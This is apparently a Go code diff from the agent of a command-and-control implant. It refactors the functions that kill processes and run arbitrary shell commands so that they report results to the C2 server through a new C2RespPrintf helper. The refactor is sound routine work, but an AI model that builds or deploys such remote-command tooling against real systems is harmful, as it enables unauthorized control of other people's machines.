@@ -2,7 +2,6 @@ package agent
 
 import (
 	"bytes"
-	"fmt"
 	"os"
 	"os/exec"
 	"runtime"
@@ -17,26 +16,26 @@ import (
 func killCmdRun(cmd *cobra.Command, args []string) {
 	pid, _ := cmd.Flags().GetInt("pid")
 	if pid == 0 {
-		SendCmdRespToC2("error: no pid specified", cmd, args)
+		C2RespPrintf(cmd, "error: no pid specified")
 		return
 	}
 	proc, err := os.FindProcess(pid)
 	if err != nil {
-		SendCmdRespToC2(fmt.Sprintf("Failed to find process %d: %v", pid, err), cmd, args)
+		C2RespPrintf(cmd, "Failed to find process %d: %v", pid, err)
 		return
 	}
 	if err = proc.Kill(); err != nil {
-		SendCmdRespToC2(fmt.Sprintf("Failed to kill process %d: %v", pid, err), cmd, args)
+		C2RespPrintf(cmd, "Failed to kill process %d: %v", pid, err)
 		return
 	}
-	SendCmdRespToC2(fmt.Sprintf("Process %d killed", pid), cmd, args)
+	C2RespPrintf(cmd, "Process %d killed", pid)
 }
 
 // execCmdRun executes a command and returns its output.
 func execCmdRun(cmd *cobra.Command, args []string) {
 	cmdStr, _ := cmd.Flags().GetString("cmd")
 	if cmdStr == "" {
-		SendCmdRespToC2("exec: empty command", cmd, args)
+		C2RespPrintf(cmd, "exec: empty command")
 		return
 	}
 	parsed := util.ParseCmd(cmdStr)
@@ -49,7 +48,7 @@ func execCmdRun(cmd *cobra.Command, args []string) {
 	execCmd.Stderr = &outBuf
 	err := execCmd.Start()
 	if err != nil {
-		SendCmdRespToC2(fmt.Sprintf("exec failed: %v", err), cmd, args)
+		C2RespPrintf(cmd, "exec failed: %v", err)
 		return
 	}
 	// If not running in background, wait with a timeout.
@@ -64,8 +63,8 @@ func execCmdRun(cmd *cobra.Command, args []string) {
 			}
 		}()
 	} else {
-		SendCmdRespToC2(fmt.Sprintf("Command '%s' running in background, PID %d", cmdStr, execCmd.Process.Pid), cmd, args)
+		C2RespPrintf(cmd, "Command '%s' running in background, PID %d", cmdStr, execCmd.Process.Pid)
 		return
 	}
-	SendCmdRespToC2(outBuf.String(), cmd, args)
+	C2RespPrintf(cmd, "%s", outBuf.String())
 }
